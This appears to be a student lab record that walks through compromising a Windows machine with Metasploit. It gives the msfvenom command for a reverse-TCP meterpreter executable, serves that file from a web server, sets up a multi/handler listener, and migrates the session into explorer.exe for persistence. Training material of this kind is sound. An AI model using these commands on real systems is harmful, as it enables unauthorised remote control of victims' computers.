Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


Find the attackers ip address using ifconfig

Create a malicious executable file fun.exe using msfvenom command


msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

copy the fun.exe into the apache /var/www/html folder

Start apache server


sudo systemctl apache2 start

Starting a command and control Server


use multi/handler


set PAYLOAD windows/meterpreter/reverse_tcp


set LHOST 0.0.0.0


exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP 


address of your Kali machine:


http://192.168.1.2/fun.exe


The file "fun.exe" downloads.

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
